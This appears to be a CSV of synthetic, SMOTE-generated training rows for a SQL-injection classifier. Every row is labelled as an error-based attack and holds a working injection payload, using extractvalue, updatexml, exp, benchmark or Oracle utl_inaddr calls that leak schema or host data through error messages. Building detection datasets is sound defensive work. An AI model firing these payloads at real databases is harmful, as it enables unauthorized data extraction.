id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000111,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",nearest_attack_euclidean,R000285,0.0628546260411536
SMOTE_000112,attack,error,"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000215,0.19502707870145614
SMOTE_000113,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000159,0.004261936351243196
SMOTE_000114,attack,error,"1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000269,0.1614874628420756
SMOTE_000115,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000105,1.0536261922258638
SMOTE_000116,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000292,0.7452008335094499
SMOTE_000117,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,0.031701528896057755
SMOTE_000118,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zpyx'  =  'zpyx",nearest_attack_euclidean,R000229,0.7483823309053111
SMOTE_000119,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000219,2.403229010884493
SMOTE_000120,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000210,0.24017283830431962
SMOTE_000121,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",nearest_attack_euclidean,R000012,0.7158195323766319
SMOTE_000122,attack,error,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000141,0.01551023303129774
SMOTE_000123,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",nearest_attack_euclidean,R000063,0.8798651801682366
SMOTE_000124,attack,error,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000294,0.7991548985932267
SMOTE_000125,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000073,0.0006793861660789217
SMOTE_000126,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000022,0.0
SMOTE_000127,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000136,0.24399064000887555
SMOTE_000128,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000006,0.02914851674354554
SMOTE_000129,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.7179987979526398
SMOTE_000130,attack,error,"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",nearest_attack_euclidean,R000024,1.2745272111728634
SMOTE_000131,attack,error,"1%'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000294,0.8112554661078976
SMOTE_000132,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk",nearest_attack_euclidean,R000072,0.031234140323464596
SMOTE_000133,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000207,0.036014203017934496
SMOTE_000134,attack,error,"1"" procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000135,1.575443743378516
SMOTE_000135,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",nearest_attack_euclidean,R000065,0.21641985841204572
SMOTE_000136,attack,error,"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000058,0.2764078548934024
SMOTE_000137,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000081,1.1995461754931234
SMOTE_000138,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.4420527717161299
SMOTE_000139,attack,error,"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",nearest_attack_euclidean,R000253,0.11465776227130585
SMOTE_000140,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000297,0.1238023547041618
SMOTE_000141,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000230,0.5839542962464823
SMOTE_000142,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000146,0.7739195729383698
SMOTE_000143,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000238,0.008174316178222332
SMOTE_000144,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000022,4.675071609289069e-06
SMOTE_000145,attack,error,"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000237,0.13246772444639737
SMOTE_000146,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",nearest_attack_euclidean,R000295,0.11395715633846398
SMOTE_000147,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000092,0.3180786908620819
SMOTE_000148,attack,error,"1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524",nearest_attack_euclidean,R000037,0.44581718998241465
SMOTE_000149,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R000102,1.0380488091237794
SMOTE_000150,attack,error,"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000115,0.32479761557364334
SMOTE_000151,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000293,0.10598908221659002
SMOTE_000152,attack,error,"1'||  (  select 'qued' where 9801  =  9801 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000195,0.1863681359987168
SMOTE_000153,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000210,0.5542113830560513
SMOTE_000154,attack,error,"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000193,0.9255113465551627
SMOTE_000155,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000257,0.7478007616437014
SMOTE_000156,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'vvkl'  =  'vvkl",nearest_attack_euclidean,R000212,0.09012889695187785
SMOTE_000157,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.4345427178482576
SMOTE_000158,attack,error,"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000136,0.33496599107836306
SMOTE_000159,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",nearest_attack_euclidean,R000205,0.37143701258041284
SMOTE_000160,attack,error,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxw'  =  'zlxw",nearest_attack_euclidean,R000177,0.15041729217516495
SMOTE_000161,attack,error,"1'+  (  select inyd where 1668  =  1668 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  +'",nearest_attack_euclidean,R000125,0.7036337428546524
SMOTE_000162,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000027,0.29973707806551597
SMOTE_000163,attack,error,"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000297,0.10084708747197929
SMOTE_000164,attack,error,"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",nearest_attack_euclidean,R000117,0.39209444786346065
SMOTE_000165,attack,error,"1%""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000301,0.6073925888513608
SMOTE_000166,attack,error,"1%' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and '%'  =  '",nearest_attack_euclidean,R000235,2.39283140274173
SMOTE_000167,attack,error, (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000103,0.0660003555380583
SMOTE_000168,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000302,0.09347859757099872
SMOTE_000169,attack,error,"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",nearest_attack_euclidean,R000024,0.1253510374695592
SMOTE_000170,attack,error,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000073,0.010805307665903197
SMOTE_000171,attack,error,"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000109,0.28028731536071855
SMOTE_000172,attack,error,"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",nearest_attack_euclidean,R000164,1.7455900167697251
SMOTE_000173,attack,error,"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000215,0.2557779746910185
SMOTE_000174,attack,error,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",nearest_attack_euclidean,R000145,0.0071941205725332006
SMOTE_000175,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000173,0.6993199879082553
SMOTE_000176,attack,error,"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000077,0.9770371782603703
SMOTE_000177,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000161,0.14599343420357425
SMOTE_000178,attack,error,"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",nearest_attack_euclidean,R000200,0.16225407859294427
SMOTE_000179,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000159,0.004201102471640767
SMOTE_000180,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000293,0.06034439393752294
SMOTE_000181,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000126,0.07008047013480277
SMOTE_000182,attack,error,"1 where 4968  =  4968 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000175,0.42246096294611546
SMOTE_000183,attack,error,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000240,0.0012666664273723875
SMOTE_000184,attack,error,"1'  )   where 1093  =  1093 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000119,0.264033334911017
SMOTE_000185,attack,error,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",nearest_attack_euclidean,R000299,0.9915126126070746
SMOTE_000186,attack,error,"1  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  3294  =  3294",nearest_attack_euclidean,R000222,0.49991062555011945
SMOTE_000187,attack,error,"1  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  6690  =  6690",nearest_attack_euclidean,R000045,0.6606000150491029
SMOTE_000188,attack,error,"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000057,0.0328073184841249
SMOTE_000189,attack,error,"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000221,0.3677901660602566
SMOTE_000190,attack,error,"1'+  (  select 'otqy' where 2754  =  2754 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000116,0.7183424259260729
SMOTE_000191,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000099,0.22383126083149935
SMOTE_000192,attack,error,"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000174,0.0388620956860548
SMOTE_000193,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000146,1.3599955583311654
SMOTE_000194,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""igop""  =  ""igop",nearest_attack_euclidean,R000030,0.49258641836288874
SMOTE_000195,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",nearest_attack_euclidean,R000244,1.0172960224060021
SMOTE_000196,attack,error,"1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000213,0.35425586303474854
SMOTE_000197,attack,error,"1'  )   where 1804  =  1804 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000213,0.07683309608953105
SMOTE_000198,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",nearest_attack_euclidean,R000053,0.5731847986700463
SMOTE_000199,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000249,0.1236901601025722
SMOTE_000200,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000225,0.5851876614559144
SMOTE_000201,attack,error,"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",nearest_attack_euclidean,R000241,0.20542109533356662
SMOTE_000202,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""cdnc"" like ""cdnc",nearest_attack_euclidean,R000013,0.9367693466747075
SMOTE_000203,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000176,0.03875504717101399
SMOTE_000204,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000022,0.0
SMOTE_000205,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,0.35632888450971645
SMOTE_000206,attack,error,"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000098,0.4397562060078061
SMOTE_000207,attack,error,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh",nearest_attack_euclidean,R000184,0.5304610418719622
SMOTE_000208,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000105,0.35282359075862746
SMOTE_000209,attack,error,"1'  )   as yuqv where 6007  =  6007 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000169,0.6096860744381984
SMOTE_000210,attack,error,"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000020,0.6398739775254783
SMOTE_000211,attack,error,"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",nearest_attack_euclidean,R000044,1.7402095857378723
SMOTE_000212,attack,error,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",nearest_attack_euclidean,R000299,0.6016125334342165
SMOTE_000213,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000292,0.6921505787151205
SMOTE_000214,attack,error,"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000190,0.10268488261093192
SMOTE_000215,attack,error,"1'+  (  select 'qpxk' where 7139  =  7139 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",nearest_attack_euclidean,R000162,1.2468593672342598
SMOTE_000216,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",nearest_attack_euclidean,R000036,0.09645765590653727
SMOTE_000217,attack,error,"1""   )    )    as eqeb where 6784  =  6784 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000154,0.7785050373940889
SMOTE_000218,attack,error,"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000190,0.45891777151931606
SMOTE_000219,attack,error,"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",nearest_attack_euclidean,R000042,0.026270907872974914
